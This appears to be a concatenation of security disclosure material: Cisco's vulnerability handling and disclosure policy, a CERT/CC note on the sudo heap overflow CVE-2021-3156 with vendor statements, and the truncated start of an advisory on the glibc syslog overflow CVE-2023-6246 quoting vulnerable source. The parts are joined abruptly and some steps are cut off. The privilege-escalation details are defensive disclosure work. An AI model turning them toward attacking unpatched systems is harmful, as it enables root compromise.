## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |
| **Hours** | 24 hours a day, 7 days a week |

## Receiving Security Vulnerability Information from Cisco

There are several ways to stay connected and receive the latest security vulnerability information from Cisco. Customers should review the following table, and subsequent summaries, to determine the appropriate option for them:

| **Cisco.com** | <https://www.cisco.com/security/> |

| **My Notifications** | <https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

The [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) allows registered Cisco.com users to subscribe to and receive important Cisco product and technology information, including Cisco Security Advisories. This service provides an improved unified subscription experience, allowing users to choose the timing of notifications as well as the notification delivery method (email or RSS feed). The level of access will be determined by the subscriber's relationship with Cisco.

### Creating a Notification

To create a notification, use the following steps:

1. Log in to the [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) on Cisco.com using a registered Cisco.com account name and password.

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

## Sudo set\_cmd() is vulnerable to heap-based buffer overflow

#### Vulnerability Note VU#794544

Original Release Date: 2021-02-04 | Last Revised: 2021-04-26

---

### Overview

A heap-based overflow has been discovered in the `set_cmd()` function in sudo, which may allow a local attacker to execute commands with elevated administrator privileges.

### Description

From the [Sudo Main Page](https://sudo.ws):

> Sudo (su "do") allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.

It is possible for a local Non-administrative user to exploit this vulnerability to elevate their privileges so that they can execute commands with administrator privileges. The team at [Qualys](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) assigned this vulnerability CVE-2021-3156 and found multiple \*nix operating systems were vulnerable, including Fedora, Debian, and Ubuntu. A blog update from February 3, 2021, reports that macOS, AIX, and Solaris may be vulnerable, but Qualys had not yet confirmed this.
There is [additional reporting](https://www.zdnet.com/article/recent-root-giving-sudo-bug-also-impacts-macos/) that other operating systems are affected, including Appleâs Big Sur.

### Impact

If an attacker has local access to an affected machine then it is possible for them to execute commands with administrator privileges.

### Solution

**Apply an Update**

Update sudo to the latest version to address this vulnerability when operationally feasible. This issue is resolved in sudo version 1.9.5p2. Please install this version, or a version from your distribution that has the fix applied to it

### Acknowledgements

This vulnerability was researched and reported by the Qualys Research Team.

#### Vendor Statement

Juniper SIRT has confirmed that Sudo is not supplied with JUNOS/FreeBSD, hence these are not affected.

On Juniper platforms which are hosted on Wind River Linux (WRL) instances, the WRL instance contains the vulnerable version of Sudo, but only within the WRL OS. To exploit this vulnerability on Wind River Linux (WRL), authenticated users with Junos shell access, would first need to switch to a root account and then login to WRL OS. The vulnerability is contained within the WRL instance for which the Junos user would already have root privileges.

#### Vendor Statement

illumos itself does not have sudo in its source. Illumos distros, however, do.

A NOTE: base illumos has the RBAC/profile-based pfexec(1) family of commands that are an alternative for sudo.

SmartOS: Use `pkgin upgrade` on any zones that have sudo installed.

OmniOSce and OpenIndiana (both use the IPS package system): Use `pkg update` to obtain the latest sudo if it's installed.

Dilos: Is fixed in update https://bitbucket.org/dilos/du2/commits/ca5129c54c84d7b2fd75d17e465e970435018f55 - a Debian-style update will install it.

| **CVE-2021-3156** | Not Affected |
| --- | --- |

#### Vendor Statement

The Zephyr project is an embedded RTOS, and as such, does not directly have the capability to run sudo. However, there are few instances of sudo in the project scripts and documentation.

* Numerous instances throughout the documentation of suggestions to run a command with sudo. Generally, these are platform package management commands, in order to install dependencies needed to build Zephyr. It is assumed that the developer already has privileges necessary to run these commands, and this exploit would not gain additional privileges.
* sudo is used in CI to install dependencies needed to run the tests. These operations are run in a containered environment, and sudo is configured to run without requesting a password. Again privileges are required to run the tests, and no additional privileges are gained through this exploit.

CVE-2023-6246: Heap-based buffer overflow in the glibc's syslog()

========================================================================
Summary
========================================================================

We discovered a heap-based buffer overflow in the GNU C Library's
__vsyslog_internal() function, which is called by both syslog() and
vsyslog(). This vulnerability was introduced in glibc 2.37 (in August
2022) by the following commit:

  <https://sourceware.org/git?p=glibc.git;a=commit;h=52a5be0df411ef3ff45c10c7c308cb92993d15b1>

and was also backported to glibc 2.36 because this commit was a fix for
another, minor vulnerability in __vsyslog_internal() (CVE-2022-39046, an
"uninitialized memory [read] from the heap"):

  <https://sourceware.org/bugzilla/show_bug.cgi?id=29536>

For example, we confirmed that Debian 12 and 13, Ubuntu 23.04 and 23.10,
and Fedora 37 to 39 are vulnerable to this buffer overflow. Furthermore,
we successfully exploited an up-to-date, default installation of Fedora
38 (on amd64): a Local Privilege Escalation, from any unprivileged user
to full root. Other distributions are probably also exploitable.

To the best of our knowledge, this vulnerability cannot be triggered
remotely in any likely scenario (because it requires an argv[0], or an
openlog() ident argument, longer than 1024 bytes to be triggered).

Last-minute note: in December 1997 Solar Designer published information
about a very similar vulnerability in the vsyslog() of the old Linux
libc (<https://insecure.org/sploits/linux.libc.5.4.38.vsyslog.html>).

========================================================================
Analysis
========================================================================

In the glibc, both syslog() and vsyslog() call the vulnerable function
__vsyslog_internal():

------------------------------------------------------------------------
122 __vsyslog_internal (int pri, const char *fmt, va_list ap,
123                     unsigned int mode_flags)
124 {
125   /* Try to use a static buffer as an optimization.  */
126   char bufs[1024];
127   char *buf = NULL;
128   size_t bufsize = 0;
...
171 #define SYSLOG_HEADER(__pri, __timestamp, __msgoff, pid) \
172   "<%d>%s%n%s%s%.0d%s: ",                                \
173   __pri, __timestamp, __msgoff,                          \
174   LogTag == NULL ? __progname : LogTag,                  \
175   "[" + (pid == 0), pid, "]" + (pid == 0)
...
182     l = __snprintf (bufs, sizeof bufs,
183                     SYSLOG_HEADER (pri, timestamp, &msgoff, pid));
...
187   if (0 <= l && l < sizeof bufs)
188     {
...
202     }
203
204   if (buf == NULL)
205     {
206       buf = malloc ((bufsize + 1) * sizeof (char));
...
213             __snprintf (buf, l + 1,
214                         SYSLOG_HEADER (pri, timestamp, &msgoff, pid));
...
221           __vsnprintf_internal (buf + l, bufsize - l + 1, fmt, apc,
222                                 mode_flags);
------------------------------------------------------------------------

